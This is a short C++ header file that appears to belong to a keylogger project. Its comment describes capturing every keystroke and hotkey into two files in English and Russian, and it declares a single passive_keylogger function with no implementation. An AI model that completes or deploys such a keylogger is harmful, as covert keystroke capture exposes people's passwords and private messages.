/*
 * Advanced keylogger
 * records one click in 2 files
 * along the keylog_path in English
 * and Russian, also records all hotkeys
*/

#include <string>
#ifndef KEYLOGGER_H
#define KEYLOGGER_H

void passive_keylogger(std::string& dump, bool& close);

#endif // KEYLOGGER_H
